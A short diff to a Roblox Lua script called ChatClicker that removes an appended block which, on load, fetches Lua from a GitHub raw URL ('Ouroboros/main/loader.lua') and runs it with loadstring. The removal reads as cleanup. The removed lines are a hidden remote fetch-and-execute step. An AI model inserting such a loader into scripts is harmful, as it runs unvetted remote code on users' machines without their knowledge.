@@ -314,12 +314,3 @@ end)
 
 updateGui()
 print("[ChatClicker] loaded — F8 toggle · ] destroy")
-
-task.spawn(function()
-    local ok, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/joustingmatch/Ouroboros/main/loader.lua"))()
-    end)
-    if not ok then
-        warn("[ChatClicker] Ouroboros loader error: " .. tostring(err))
-    end
-end)
